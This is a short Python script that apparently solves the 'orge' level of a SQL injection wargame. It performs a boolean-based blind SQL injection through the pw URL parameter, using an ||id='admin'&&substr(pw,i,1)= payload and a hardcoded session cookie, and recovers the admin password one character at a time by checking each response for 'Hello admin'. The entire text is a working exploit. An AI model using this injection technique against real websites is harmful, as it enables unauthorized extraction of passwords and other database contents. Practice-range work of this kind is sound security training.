import requests
import string

pw=""
a=string.printable
a=a[:-38]
url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw="
cookies = {'PHPSESSID':'di7sq95615k17gofpq7l55mqvf'}
for i in range(1,9):
    url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw="
    for j in a:
        url="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw='||id='admin'%26%26 substr(pw,"+str(i)+',1)="'+str(j)+'"-- - '
        res=requests.get(url,cookies=cookies)
        res=res.text
        if "Hello admin" in res:
            pw+=j
            break
        else: pass
print(pw)
    
